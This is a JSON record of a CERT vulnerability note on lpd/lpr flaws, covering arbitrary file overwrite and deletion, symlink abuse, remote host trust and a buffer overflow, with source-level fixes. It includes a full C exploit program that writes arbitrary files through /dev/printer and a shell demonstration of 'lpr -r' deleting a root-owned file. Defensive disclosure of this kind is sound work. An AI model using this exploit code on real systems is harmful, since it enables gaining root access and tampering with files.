{
  "Impact": "See description above.", 
  "CVSS_SecurityRequirementsIR": "", 
  "CVSS_EnvironmentalVector": "", 
  "Title": "lpr", 
  "DateFirstPublished": "", 
  "CVSS_AccessVector": "", 
  "CAM_ScoreCurrentWidelyKnown": 0, 
  "IDNumber": "4057", 
  "SystemsAffectedPreamble": "", 
  "CVSS_SecurityRequirementsCR": "", 
  "CVSS_Authenication": "", 
  "CVSS_BaseScore": "", 
  "CAM_EaseOfExploitation": "0", 
  "IPProtocol": "", 
  "CERTAdvisory": "CA-1991-10", 
  "CVSS_CollateralDamagePotential": "", 
  "Revision": "1", 
  "CVEIDs": "", 
  "VRDA_D1_DirectReport": "", 
  "CAM_WidelyKnown": "0", 
  "CAM_Population": "0", 
  "Description": "{ From VU#6123/Mail/4 }\n\n\nThese bugs have been *actively* exploited on a wide variety of machines.\n\nLPD/LPR HOLES:\n1)lpd allows a user to overwrite ANY file.\n2)lpd allow a user to unlink any file.\n3)lpd allows a user to print any file via control directives.\n4)lpd allows a user to print any file via symlinks.\n5)lpd remote printing requires TOTAL trust of the remote host.\n6)lpd has a buffer overflow problem.\n7)lpr allows a user to remove any file from \"/\".\n\nBACKGROUND:  There are two separate attack points with this hole.  The\nfirst is the the AF_UNIX domain socket \"/dev/printer\". The second is\nthough the privileged internet port 515.\n\nAccess to \"/dev/printer\" to be blocked by two different methods.\n1) If your system checks access on sockets, then lpd should\nchmod /etc/printer BEFORE it begins 'listening' on the\nsocket. We believe that on most systems, any\nconnections made (attempted) before the listen will\nfail or be useless. We suggest you test this first.\n\n2) If your system does NOT check access on sockets, we suggest\nthat you move the \"/dev/printer\" socket to\n\"/dev/lpd/printer\" where the directory \"/dev/lpd\" has\nmode 0700 and is owned by root.\n\nAccess through port 515 requires the user to have root access on the remote\nmachine, however given the ease at which users can gain root\naccess through \"/dev/printer\" on the remote machine, you can assume\nthat such access exists.\n\nCHANGES TO LPD:\nTo prevent the 'spread' of root access to your local machine, and to\nprotect your machine from other attacks, your lpd will need\nto implement the following changes.\n\nrecvjob.c readjob() should refuse to accept any data file\nor control file path name that is outside of the\nspool directory. **\n\nrecvjob.c readfile() should open all file O_EXCL and call fatal\nif it finds that the file already exists.\n\nrecvjob.c readfile() should lstat() all path names given to\nit to make certain that the file does not exist as\na symbolic link, and call fatal if it is a symlink.\n\nrecvjob.c readfile() should refuse to accept any data file whose\nname begins with \"cf\" or \"tf\".\n\nrecvjob.c readjob() should pass a flag to readfile() telling it\nthat the file being read is a control file. readfile()\nshould then add a sentinel line to the beginning of the\nfile marking it as a control file from a remote host.\nNote: all control files passed to readfile() are remote\nas lpr does not use lpr to 'deliver' local print jobs.\n\nprintjob.c printit() should check for the remote control file\nsentinel and recognize U (unlink) directives ONLY for\nregular files in the spool directory.\n\nprintjob.c printit() should check for the remote control file\nsentinel and only call print() for files in the spool\ndirectory.\n\nprintjob.c print() should refuse to print symlink jobs if the\nfile pointed to by the symlink is not the file pointed\nto when the job was submitted. **\n\nrecvjob.c recvjob() needs to check that the data it is reading\ndoes not overflow the char array 'line'.\n\nlpd.c chkhost() should use /etc/hosts.printer as well as\n/etc/hosts.equiv if it does not already do so. This\nallows a remote host to be trusted for printing,\nbut not trusted generally.\n\n** NOTE: Fixes marked with \"**\" may already be present on\nyour system.\n\nCHANGES TO LPR:\nThe system command lpr has a coding error that allows users to unlink\nany printable file in \"/\". This can be corrected by\n\nlpr.c test() should be careful to avoid passing access() a null\nstring if rindex(file, '/') == file. In this case, \"/\"\nshould be passed to access().\n\n========================================================================\n\nA program that exploits this bug was reverse engineered at a site\nsystem crackers accidentally left it on one of their targets.\n\nA trivially modified version of the program found is enclosed; you may\nneed to make some modifications to make it work on your machine, but the\nbasic principle remains -- it *definitely* affects a wide variety of OS's.\nIt takes three arguments: \"printer fromfile tofile\", where printer is a\nprinter that exists on the system, fromfile is the target file and tofile\nis the destination.\n\nThis program attempts to replicate the aformentioned program.  It manages\nto have the same functionality, but after completion the tofile is removed\n(in other words, don't try to overwrite your password file).  In order to\ndemonstrate that the tofile is created, they have put a sleep() in the\ncode.  Note that this version of the program is still a security problem\nas the sleep could be for long enough for an open root account to be created\nand exploited.\n\n=========================================================\n\nmain(argc, argv)\nint     argc;\nchar   *argv[];\n{\nint     sock, i, n, f;\nchar    line[2048], *fromfile, *tofile, *buff, *malloc();\nstruct  stat sb;\n\nif (argc != 3)\n{\nfprintf(stderr, \"Usage: rootcp fromfile tofile\\n\");\nexit(1);\n}\nfromfile = argv[1];\ntofile = argv[2];\nif ((f = open(fromfile, O_RDONLY)) == -1)\n{\nfprintf(stderr, \"Failed to open '%s'\\n\", fromfile);\nexit(1);\n}\nif (fstat(f, &sb) != 0)\n{\nfprintf(stderr, \"Failed to stat '%s'\\n\", fromfile);\nexit(1);\n}\nif ((buff = malloc(sb.st_size)) == NULL)\n{\nfprintf(stderr, \"Failed to malloc buffer space for copy of '%s'\\n\",\nfromfile);\nexit(1);\n}\nif (read(f, buff, sb.st_size) != sb.st_size)\n{\nfprintf(stderr, \"Failed to read '%s' into buffer\\n\", fromfile);\nexit(1);\n}\n{\nstruct sockaddr_un userver;\nsock = socket(AF_UNIX, SOCK_STREAM, 0);\nif (sock < 0)\n{\nperror(\"socket()\");\nexit(1);\n}\nuserver.sun_family = AF_UNIX;\nstrcpy(userver.sun_path, \"/dev/printer\");\nif (connect(sock,(struct sockaddr*)&userver, strlen(userver.sun_path) + 2) < 0)\n{\nperror(\"connect()\");\nexit(1);\n}\n}\nsprintf(line, \"\\2VALIDPRINTER\\n\");\nprintf(\"--> \\\\2VALIDPRINTER\\\\n\\n\");\nif (write(sock, line, strlen(line)) != strlen(line))\n{\nperror(\"write()\");\nexit(1);\n}\nif (read(sock, line, 1) == 1)\n{\nprintf(\"<-- %d\\n\", line[0]);\nif (line[0] != '\\0')\n{\nclose(sock);\nexit(1);\n}\n}\n\nprintf(\"--> \\\\3%d %s\\\\n\\n\",  sb.st_size, tofile);\nsprintf(line, \"\\3%d %s\\n\", sb.st_size, tofile);\nif (write(sock, line, strlen(line)) != strlen(line))\n{\nperror(\"write()\");\nexit(1);\n}\n/*\nif (read(sock, line, 1) == 1)\n{\nprintf(\"<-- %d\\n\", line[0]);\nif (line[0] != '\\0')\n{\nclose(sock);\nexit(1);\n}\n}\n*/\nprintf(\"Copying file\\n\");\nif (write(sock, buff, sb.st_size) != sb.st_size)\n{\nperror(\"write()\");\nexit(1);\n}\nprintf(\"Not sending ack\\n\");\nsleep(20);\nexit(0);\nprintf(\"File copied\\n--> \\\\0\\n\");\nif (write(sock, '\\0', 1) != 1)\n{\nperror(\"write()\");\nexit(1);\n}\n\nprintf(\"Checking for ack\\n\");\nif (read(sock, line, 1) == 1)\n{\nprintf(\"<-- %d\\n\", line[0]);\nif (line[0] != '\\0')\n{\nclose(sock);\nexit(1);\n}\n}\n(void) close(sock);\nexit(0);\n}\n\n===========================================================================\n\nProblem -- lpr can delete any file on \"/\" that is readable by the user.\n\nExample -- type (\"%\" is the prompt):\n\n% whoami\nmjw\n\n% ls -ld / /foobar\ndrwxr-xr-x 15 root          512 May  2 20:51 /\n-rwxr-xr-x  1 root            4 May  2 20:50 /foobar\n\n% lpr -r /foobar\n\n% ls -l /foobar\n/foobar: No such file or directory\n\n\n===========================================================================\n\nProblem - incorrect use of getlogin\n\nThis is a generic problem for suid programs which may pertain to lprm\nand possibly other printing utilities:\n\nIf /etc/utmp contains incorrect information (this file is world\nwritable in some OS implementations) then any program which uses\ngetlogin(3) incorrectly could pick up an incorrect login name.\n\nContrary to the man page, the correct way to use getlogin() is to first\n\ngetpwnam(getlogin())\n\nand see if the uid returned is the same as given by getuid().\nIf so, use getlogin().  If not, then use the name returned by:\n\ngetpwuid(getuid())", 
  "CVSS_AccessComplexity": "", 
  "CVSS_SecurityRequirementsAR": "", 
  "Resolution": "", 
  "Author": "This document was written by CN=Rob D McMillan/O=CERT.", 
  "CAM_Exploitation": "0", 
  "DateLastUpdated": "1999-02-15T09:21:38-05:00", 
  "CVSS_IntegrityImpact": "", 
  "VRDA_D1_Population": "", 
  "CVSS_TemporalVector": "", 
  "CVSS_ReportConfidence": "", 
  "CVSS_ConfidentialityImpact": "", 
  "CVSS_BaseVector": "", 
  "VulnerabilityCount": 1, 
  "CVSS_Exploitability": "", 
  "ThanksAndCredit": "", 
  "US-CERTTechnicalAlert": "", 
  "CAM_ScoreCurrentWidelyKnownExploited": 0, 
  "CVSS_TemporalScore": "", 
  "VRDA_D1_Impact": "", 
  "CVSS_TargetDistribution": "", 
  "CAM_InternetInfrastructure": "0", 
  "CVSS_RemediationLevel": "", 
  "Workarounds": "", 
  "ID": "VU#4057", 
  "CVSS_AvailabilityImpact": "", 
  "CAM_ScoreCurrent": 0, 
  "Overview": "", 
  "CAM_Impact": "0", 
  "DatePublic": "", 
  "DateCreated": "1999-01-05T17:24:20-05:00", 
  "References": "", 
  "Keywords": "", 
  "CVSS_EnvironmentalScore": "", 
  "CAM_AttackerAccessRequired": "0"
}